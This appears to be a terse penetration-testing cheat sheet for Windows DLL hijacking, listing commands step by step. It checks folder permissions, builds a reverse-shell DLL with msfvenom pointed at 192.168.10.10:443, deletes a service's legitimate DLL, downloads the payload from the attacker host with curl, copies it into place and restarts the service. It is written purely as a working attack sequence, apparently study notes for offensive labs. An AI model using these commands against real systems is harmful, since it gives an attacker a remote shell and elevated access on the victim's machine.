# DLL Hijacking

• Permission check and service stop / start check

• Msfvenom create shell and upload ( curl, iwr, certutil)

    • icacls "C:\Program Files"

    • msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f dll -o rev.dll

    • del "C:\program files\noman\noman.dll"

    • curl 192.168.10.10/rev.dll -o noman.dll

    • cp noman.dll "C:\program files\noman\"

    • net start noman
